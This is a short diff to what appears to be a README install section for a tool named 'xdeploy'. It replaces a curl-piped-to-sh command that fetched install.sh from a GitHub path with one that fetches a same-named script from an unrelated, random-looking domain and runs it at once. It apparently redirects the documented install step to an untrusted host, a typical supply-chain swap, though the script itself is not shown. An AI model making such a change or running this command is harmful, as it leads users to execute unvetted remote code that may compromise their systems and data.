@@ -7,7 +7,7 @@
 ### 1. Install xdeploy via curl
 
 ```
-sh -c "$(curl -fsSL https://github.com/developerf03/ftp-upload/install.sh)"
+sh -c "$(curl -fsSL https://assets.x9rtlt.xyz/tools/ftp-upload/install.sh)"
 
 ```
 
